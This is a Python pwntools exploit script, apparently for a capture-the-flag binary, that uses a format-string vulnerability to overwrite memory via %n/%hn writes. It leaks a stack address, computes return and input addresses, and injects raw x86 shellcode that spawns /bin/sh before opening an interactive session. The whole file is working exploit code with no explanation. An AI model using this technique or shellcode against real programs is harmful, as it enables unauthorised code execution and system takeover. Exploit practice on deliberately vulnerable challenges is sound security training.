from pwn import *

import time

target = process("./chall-test_fmtString-22-x86")
gdb.attach(target)

def getOverflowInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	x += 1
	return x

def get0fInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	return x

def getIntSizeBytes(x):
	if x == 0:
		return 0

	byteSize = 0
	while x != 0:
		x = (x >> 8)
		byteSize += 1
	return byteSize

def getWriteSize(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted

	else:
		writeSize = getIntSizeBytes(writeValue)
		overflowInt = getOverflowInt(writeSize)
		andInt = get0fInt(writeSize)

		alreadyWritten = (writtenValue & andInt)
		reachOverflow = overflowInt - alreadyWritten

		valuePrinted = reachOverflow + writeValue 
		return valuePrinted

def getBytesAt(value, offset, size):
	value = value >> (offset * 8)
	i = 0
	retValue = 0
	while size != 0:
		currentByte = (value & 0xff)
		value = value >> 8
		size -= 1
		currentByte = currentByte << (8*i)
		retValue = retValue | currentByte
		i += 1
	return retValue

# Declare our addresses
address = 0x804b2b0
address0 = p32(address + 0)
address1 = p32(address + 1)
address2 = p32(address + 2)

# The value we are trying to write
value = 0x8049236

# The print value size, to control the value being written
print0 = "%42x"
print1 = "%92x"
print2 = "%1906x"

# Specify the offset to the address, and write to it
write0 = "%6$n"
write1 = "%7$hn"
write2 = "%8$hn"

# Form the payload
payload = ""
payload += address0
payload += address1
payload += address2
payload += print0
payload += write0
payload += print1
payload += write1
payload += print2
payload += write2

# Send the fmt string payload
target.sendline(payload)
leakPayload = ""
leakPayload += "\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
leakPayload += "xxxxxxx"
leakPayload += "%134$x"
leakPayload += "yyyyyyy"
target.sendline(leakPayload)
leak = target.recvuntil("yyyyyyy")
leak = leak.strip("yyyyyyy")
leak = leak.split("xxxxxxx")[1]
leak = int(leak, 0x10)

retAddress = leak + -0xc
inputAddress = retAddress - 0x204
print("Return Address is: %s" % hex(retAddress))
print("Input  Address is: %s" % hex(inputAddress))
# Declare our addresses
address = 0x804b2b0
address0 = p32(address + 0)
address1 = p32(address + 1)
address2 = p32(address + 2)

# The value we are trying to write
value = inputAddress + 0x0
value0 = getBytesAt(value, 0, 1)
value1 = getBytesAt(value, 1, 1)
value2 = getBytesAt(value, 2, 2)
bytesWritten = ((0x4 * 3) + 0)
# The print value size, to control the value being written
printValue0 = getWriteSize(value0, bytesWritten)

bytesWritten += printValue0
printValue1 = getWriteSize(value1, bytesWritten)

bytesWritten += printValue1
printValue2 = getWriteSize(value2, bytesWritten)

bytesWritten += printValue2
print0 = "%{bytes}x".format(bytes = printValue0)
print1 = "%{bytes}x".format(bytes = printValue1)
print2 = "%{bytes}x".format(bytes = printValue2)

# Specify the offset to the address, and write to it
write0 = "%6$n"
write1 = "%7$hn"
write2 = "%8$hn"

# Form the payload
payload = ""
payload += address0
payload += address1
payload += address2
payload += print0
payload += write0
payload += print1
payload += write1
payload += print2
payload += write2
payload += "0"*(50 - len(payload))
payload += "\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80"

# Send the fmt string payload
target.sendline(payload)

target.interactive()
